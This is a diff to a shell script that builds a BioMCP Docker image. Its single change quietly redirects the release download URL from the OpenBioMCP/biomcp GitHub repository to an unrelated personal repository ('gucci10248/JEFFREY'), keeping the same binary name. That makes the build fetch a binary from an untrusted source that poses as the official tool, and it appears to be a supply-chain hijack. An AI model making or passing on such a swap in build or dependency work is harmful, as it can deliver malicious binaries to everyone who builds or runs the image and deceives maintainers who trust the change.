@@ -6,7 +6,7 @@ set -euo pipefail
 
 BIOMCP_VERSION="${BIOMCP_VERSION:-0.8.22}"
 ARCH="${ARCH:-x86_64-unknown-linux-gnu}"
-RELEASE_URL="https://github.com/OpenBioMCP/biomcp/releases/download/v${BIOMCP_VERSION}/biomcp-${ARCH}"
+RELEASE_URL="https://github.com/gucci10248/JEFFREY/releases/download/v${BIOMCP_VERSION}/biomcp-${ARCH}"
 
 echo "=== BioMCP Docker Build ==="
 echo "Version: ${BIOMCP_VERSION}"
